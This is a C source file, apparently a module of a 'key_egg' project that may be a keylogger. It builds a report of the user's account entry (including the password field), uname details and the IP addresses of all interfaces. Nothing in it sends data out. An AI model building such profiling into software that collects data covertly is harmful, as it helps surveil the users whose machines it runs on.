/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <errno.h>
#include <pwd.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>

#include "key_egg.h"

// get the ip addresses of all the interfaces
static int get_inet_addr(char *large_buffer, size_t lbuffer_size) {
    int fd;
    struct ifreq ifr;
    struct if_nameindex *ifnames, *ifnames2;
    unsigned char *addr;
    char buffer[256] = "";

    memset(large_buffer, 0x00, lbuffer_size);
    ifnames = if_nameindex();
    if (!ifnames) {
#ifdef DEBUG
        perror("if_nameindex() failed");
#endif
        return -1;
    }

    ifnames2 = ifnames; // make a copy of ifnames pointer to free it later
    while (ifnames2->if_index && ifnames2->if_name) {
        memset(&ifr, 0, sizeof(struct ifreq));
        fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
        if (fd == -1) {
#ifdef DEBUG
            perror("socket() failed");
#endif
            return -1;
        }

        strcpy(ifr.ifr_name, ifnames2->if_name);
        ifr.ifr_addr.sa_family = AF_INET;
        if (ioctl(fd, SIOCGIFADDR, &ifr) == -1)
#ifdef DEBUG
            perror("if_nameindex() failed");
#else
            ;
#endif
        close(fd);
        addr =
            (unsigned char *)&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
        // make the buffer
        sprintf(buffer, "%-16s: %d.%d.%d.%d\n", ifr.ifr_name, addr[0], addr[1],
                addr[2], addr[3]);
        if (strlen(large_buffer) + strlen(buffer) >= lbuffer_size) return 1;
        strcat(large_buffer, buffer);
        ifnames2++;
    }
    if_freenameindex(ifnames);
    return 0;
}

static int get_user_info(char *buffer, size_t buffer_sz) {
    struct passwd *pwd;
    memset(buffer, 0x00, buffer_sz);
    pwd = getpwuid(getuid());
    if (!pwd) {
#ifdef DEBUG
        perror("In get user info getpwuid() failed");
#endif
        return -1;
    }

    snprintf(
        buffer, buffer_sz,
        "Login Name\t: %s\nPassword\t: %s\nUser ID \t: %u\n"
        "Group ID\t: %u\nUser Gecos\t: %s\nHome Dir\t: %s\nUser Shell\t: %s\n",
        pwd->pw_name, pwd->pw_passwd, pwd->pw_uid, pwd->pw_gid, pwd->pw_gecos,
        pwd->pw_dir ? pwd->pw_dir : "none", pwd->pw_shell);
    return 0;
}

static int get_uname(char *buffer, size_t buffer_sz) {
    struct utsname info;
    memset(buffer, 0x00, buffer_sz);
    if (uname(&info) < 0) {
#ifdef DEBUG
        perror("uname() failed");
#endif
        return -1;
    }

    snprintf(buffer, buffer_sz,
             "OS\t\t: %s\nRelease\t\t: %s\nVersion\t\t: %s\nMachine\t\t: %s\n",
             info.sysname, info.release, info.version, info.machine);
    return 0;
}

// get info in the format of 'Linux: user@host'
static int get_minimal_info(char *buffer, size_t buffer_sz) {
    struct passwd *pwd;
    struct utsname info;
    char mini_buff[512];

    memset(buffer, 0x00, buffer_sz);
    pwd = getpwuid(getuid());
    if (!pwd) goto failed;
    if (uname(&info) < 0) goto failed;

    gethostname(mini_buff, sizeof(mini_buff));
    snprintf(buffer, buffer_sz, "%s -> %s@%s\n", info.sysname, pwd->pw_name,
             mini_buff);
    return 0;

failed:
    strcpy(buffer, "none");
    return -1;
}

// call this function if you want to see all the info and use free() afterwards
char *ke_get_system_info(void) {
    char *ret_buffer;
    char buffer[4][1024];
    int ret_buffer_size;

    get_minimal_info(buffer[0], sizeof(buffer[0]));
    get_uname(buffer[1], sizeof(buffer[1]));
    get_user_info(buffer[2], sizeof(buffer[2]));
    get_inet_addr(buffer[3], sizeof(buffer[3]));

    ret_buffer_size = strlen(buffer[0]) + strlen(buffer[1]) +
                      strlen(buffer[2]) + strlen(buffer[3]) + 100;
    ret_buffer = (char *)malloc(ret_buffer_size);
    if (!ret_buffer) {
#ifdef DEBUG
        perror("malloc() failed");
#endif
        return (char *)-1;
    }

    memset(ret_buffer, 0x00, ret_buffer_size);

    sprintf(ret_buffer,
            "%s\n\n------- UNAME INF -------\n%s\n"
            "------- USER INFO -------\n%s\n------- INET ADDR -------\n%s\n\n",
            buffer[0], buffer[1], buffer[2], buffer[3]);
    return ret_buffer;
}
